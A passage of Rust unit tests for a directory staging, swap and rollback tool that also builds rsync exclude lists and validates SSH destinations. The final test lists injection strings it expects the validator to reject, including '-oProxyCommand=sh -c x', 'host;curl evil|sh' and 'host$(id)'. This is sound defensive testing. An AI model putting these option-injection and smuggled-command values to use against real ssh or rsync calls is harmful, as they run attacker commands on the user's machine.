        assert!(!base.join("root.rollback").exists());
        fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn local_swap_rollback_removes_payload_added_to_empty_destination() {
        // No live copy existed (fresh destination): rolling back must leave nothing behind.
        let base = tmpdir();
        let incoming = base.join("root.incoming");
        fs::create_dir_all(&incoming).unwrap();
        fs::write(incoming.join("f"), b"new").unwrap();

        let mut sw = swap_for(&base, "root", false);
        sw.commit_swap().unwrap();
        assert!(base.join("root").exists());

        sw.rollback().unwrap();
        assert!(!base.join("root").exists());
        assert!(!base.join("root.rollback").exists());
        fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn unswapped_rollback_just_drops_the_stage() {
        // A component that staged but was never swapped (an earlier sibling failed): rollback
        // must delete only its .incoming and touch nothing live.
        let base = tmpdir();
        let live = base.join("root");
        fs::create_dir_all(&live).unwrap();
        fs::write(live.join("f"), b"old").unwrap();
        let incoming = base.join("root.incoming");
        fs::create_dir_all(&incoming).unwrap();

        let sw = swap_for(&base, "root", true); // swapped: false
        sw.rollback().unwrap();
        assert!(!incoming.exists());
        assert_eq!(fs::read(live.join("f")).unwrap(), b"old"); // live untouched
        fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn remote_scripts_swap_commit_and_roll_back_per_component() {
        let staged = [
            RStage { name: "root", had_live: true },
            RStage { name: "net", had_live: false },
        ];
        let sw = remote_swap_script(".tup/p", &staged);
        assert!(sw.starts_with("set -e; cd .tup/p"));
        assert!(sw.contains("mv root root.rollback")); // existing copy parked
        assert!(sw.contains("mv root.incoming root"));
        assert!(sw.contains("mv net.incoming net"));

        let rb = remote_rollback_script(".tup/p", &staged);
        assert!(rb.contains("mv root.rollback root")); // parked copy restored
        assert!(rb.contains("rm -rf net")); // new-only payload removed
        assert!(rb.contains("rm -rf net.incoming"));

        let cm = remote_commit_script(".tup/p", &staged);
        assert!(cm.contains("rm -rf root.rollback")); // parked copy dropped on success
    }

    fn owned(xs: &[&str]) -> Vec<String> {
        xs.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn move_token_normalizes_paths() {
        assert_eq!(move_token("/work/node_modules"), "node_modules");
        assert_eq!(move_token("/target"), "target");
        assert_eq!(move_token("dist/"), "dist");
        assert_eq!(move_token("  build  "), "build");
    }

    #[test]
    fn ship_all_excludes_nothing() {
        assert!(compute_excludes(&[], &[], true).is_empty());
        assert!(compute_excludes(&owned(&["x"]), &owned(&["y"]), true).is_empty());
    }

    #[test]
    fn defaults_apply_with_no_policy() {
        let ex = compute_excludes(&[], &[], false);
        assert!(ex.contains(&"target/".to_string()));
        assert!(ex.contains(&"node_modules/".to_string()));
        assert_eq!(ex.len(), DEFAULT_REBUILD.len());
    }

    #[test]
    fn ship_removes_a_default_and_rebuild_adds_one() {
        // ship node_modules back into the payload; rebuild a bespoke generated dir.
        let ex = compute_excludes(&owned(&["/work/node_modules"]), &owned(&["/work/gen"]), false);
        assert!(!ex.iter().any(|p| p == "node_modules/"), "node_modules should ship: {ex:?}");
        assert!(ex.contains(&"gen/".to_string()), "gen should be excluded: {ex:?}");
        assert!(ex.contains(&"target/".to_string()), "other defaults stay");
    }

    #[test]
    fn rebuild_is_deduped_against_defaults() {
        // asking to rebuild target/ (already a default) must not duplicate the pattern.
        let ex = compute_excludes(&[], &owned(&["target"]), false);
        assert_eq!(ex.iter().filter(|p| p.trim_end_matches('/') == "target").count(), 1);
    }

    #[test]
    fn accepts_plain_ssh_targets() {
        for d in ["host", "user@host", "my-alias", "box.lan", "u_1@10.0.0.2"] {
            assert!(dest_is_valid(d), "{d} should be accepted");
        }
    }

    #[test]
    fn rejects_option_injection_and_metachars() {
        // The critical case: a leading '-' makes ssh/rsync treat the dest as an OPTION, so
        // -oProxyCommand=… would run locally. Plus anything with shell/space/quote characters.
        for d in [
            "",
            "-oProxyCommand=sh -c x",
            "--rsync-path=touch /tmp/x",
            "host;curl evil|sh",
            "host path",
            "host$(id)",
            "`id`",
            "host:2222",
            "ssh://host",
        ] {
            assert!(!dest_is_valid(d), "{d:?} should be rejected");
        }
    }
}
